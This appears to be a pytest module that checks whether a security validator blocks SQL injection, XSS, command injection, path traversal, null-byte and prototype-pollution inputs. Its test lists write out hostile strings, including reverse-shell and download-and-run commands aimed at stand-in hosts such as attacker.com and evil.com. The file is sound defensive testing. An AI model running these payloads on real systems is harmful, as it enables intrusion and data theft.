"""
Test protection against injection attacks.

This module tests that various injection attempts are properly blocked:
- SQL injection
- XSS (Cross-Site Scripting)
- Command injection
- Path traversal
- Prototype pollution
"""

import pytest
from vault.utils.security import (
    validate_role,
    validate_agent_context,
    SecurityValidationError,
)


class TestSQLInjection:
    """Test protection against SQL injection attacks."""
    
    def test_basic_sql_injection_blocked(self):
        """Basic SQL injection patterns should be blocked."""
        sql_injections = [
            "admin'; DROP TABLE users;--",
            "admin' OR '1'='1",
            "admin'; DELETE FROM accounts;--",
            "' OR 1=1--",
            "admin' UNION SELECT * FROM passwords--",
            "admin'; INSERT INTO admins VALUES ('hacker');--",
        ]
        
        for injection in sql_injections:
            with pytest.raises(SecurityValidationError, match="SQL"):
                validate_role(injection)
    
    def test_sql_keywords_in_context_blocked(self):
        """SQL keywords in context fields should be blocked."""
        malicious_contexts = [
            {
                "role": "user",
                "trustScore": 80,
                "department": "'; DROP TABLE departments;--"
            },
            {
                "role": "analyst",
                "trustScore": 75,
                "comment": "normal' UNION SELECT password FROM users--"
            },
        ]
        
        for context in malicious_contexts:
            with pytest.raises(SecurityValidationError, match="SQL"):
                validate_agent_context(context)
    
    def test_encoded_sql_injection_blocked(self):
        """Encoded SQL injection attempts should be blocked."""
        encoded_injections = [
            "admin' OR '1'='1",  # Single quotes
            'admin" OR "1"="1',  # Double quotes
            "ADMIN' OR '1'='1",  # Uppercase
            "admin'OR'1'='1",    # No spaces
        ]
        
        for injection in encoded_injections:
            with pytest.raises(SecurityValidationError, match="SQL"):
                validate_role(injection)


class TestXSSPrevention:
    """Test protection against XSS attacks."""
    
    def test_script_tags_blocked(self):
        """Script tags should be blocked."""
        xss_attempts = [
            "<script>alert('xss')</script>",
            "<SCRIPT>alert('xss')</SCRIPT>",
            "<script src='evil.js'></script>",
            "user<script>steal()</script>",
        ]
        
        for xss in xss_attempts:
            with pytest.raises(SecurityValidationError, match="XSS|script|injection"):
                validate_role(xss)
    
    def test_event_handlers_blocked(self):
        """JavaScript event handlers should be blocked."""
        event_handlers = [
            "admin' onclick='alert(1)'",
            '<img src=x onerror=alert(1)>',
            '<body onload=alert("XSS")>',
            'user" onmouseover="hack()"',
        ]
        
        for handler in event_handlers:
            with pytest.raises(SecurityValidationError, match="Event handler|XSS|injection"):
                validate_role(handler)
    
    def test_javascript_protocol_blocked(self):
        """JavaScript protocol URLs should be blocked."""
        js_protocols = [
            "javascript:alert(1)",
            "JavaScript:void(0)",
            "JAVASCRIPT:steal()",
            " javascript:hack() ",
        ]
        
        for protocol in js_protocols:
            with pytest.raises(SecurityValidationError, match="JavaScript protocol"):
                validate_role(protocol)


class TestCommandInjection:
    """Test protection against command injection."""
    
    def test_shell_metacharacters_blocked(self):
        """Shell metacharacters should be blocked."""
        shell_attacks = [
            "admin; rm -rf /",
            "user && cat /etc/passwd",
            "analyst | nc attacker.com 4444",
            "viewer`whoami`",
            "manager$(id)",
            "admin; shutdown -h now",
        ]
        
        for attack in shell_attacks:
            with pytest.raises(SecurityValidationError, match="Shell metacharacter"):
                validate_role(attack)
    
    def test_command_names_blocked(self):
        """Common dangerous commands should be blocked."""
        dangerous_commands = [
            "admin bash -c 'evil'",
            "user sh /tmp/script",
            "wget http://evil.com/backdoor",
            "curl http://attacker.com | sh",
            "nc -e /bin/sh attacker.com 4444",
        ]
        
        for command in dangerous_commands:
            with pytest.raises(SecurityValidationError, match="Command execution|Shell"):
                validate_role(command)


class TestPathTraversal:
    """Test protection against path traversal attacks."""
    
    def test_directory_traversal_blocked(self):
        """Directory traversal patterns should be blocked."""
        traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "user/../admin",
            "./../../sensitive/data",
        ]
        
        for traversal in traversals:
            with pytest.raises(SecurityValidationError, match="Path traversal"):
                validate_role(traversal)
    
    def test_system_paths_blocked(self):
        """Direct system paths should be blocked."""
        system_paths = [
            "/etc/shadow",
            "/usr/bin/passwd",
            "/var/log/auth.log",
            "C:\\Windows\\System32\\config",
        ]
        
        for path in system_paths:
            with pytest.raises(SecurityValidationError, match="System path|Path"):
                validate_role(path)


class TestPrototypePollution:
    """Test protection against prototype pollution."""
    
    def test_prototype_fields_ignored(self):
        """Prototype pollution fields should be silently ignored."""
        malicious_context = {
            "role": "user",
            "trustScore": 80,
            "__proto__": {"isAdmin": True},
            "constructor": {"prototype": {"isAdmin": True}},
            "prototype": {"pollution": "attempt"},
        }
        
        # Should not raise, but should strip dangerous fields
        result = validate_agent_context(malicious_context)
        
        # Dangerous fields should be removed
        assert "__proto__" not in result
        assert "constructor" not in result
        assert "prototype" not in result
        
        # Safe fields preserved
        assert result["role"] == "user"
        assert result["trustScore"] == 80.0


class TestNullByteInjection:
    """Test protection against null byte injection."""
    
    def test_null_bytes_blocked(self):
        """Null bytes should be blocked."""
        null_byte_attacks = [
            "admin\x00.txt",
            "user\x00<script>",
            "file.jpg\x00.php",
        ]
        
        for attack in null_byte_attacks:
            with pytest.raises(SecurityValidationError, match="Null byte"):
                validate_role(attack)


class TestCombinedInjectionAttempts:
    """Test protection against combined/chained injection attempts."""
    
    def test_multiple_injection_types_blocked(self):
        """Multiple injection types in one payload should be blocked."""
        combined_attacks = [
            "admin'; <script>alert(1)</script>--",  # SQL + XSS
            "user && wget evil.com/shell.sh | sh",   # Command + download
            "../admin'; DROP TABLE users;--",        # Path + SQL
        ]
        
        for attack in combined_attacks:
            with pytest.raises(SecurityValidationError):
                validate_role(attack)
    
    def test_deeply_nested_payloads_blocked(self):
        """Deeply nested malicious payloads should be blocked."""
        nested_context = {
            "role": "user",
            "trustScore": 80,
            "profile": {
                "name": "John",
                "preferences": {
                    "theme": "dark",
                    "notifications": {
                        "email": "user@example.com",
                        "webhook": "javascript:alert(1)"  # Nested XSS
                    }
                }
            }
        }
        
        with pytest.raises(SecurityValidationError, match="JavaScript protocol"):
            validate_agent_context(nested_context)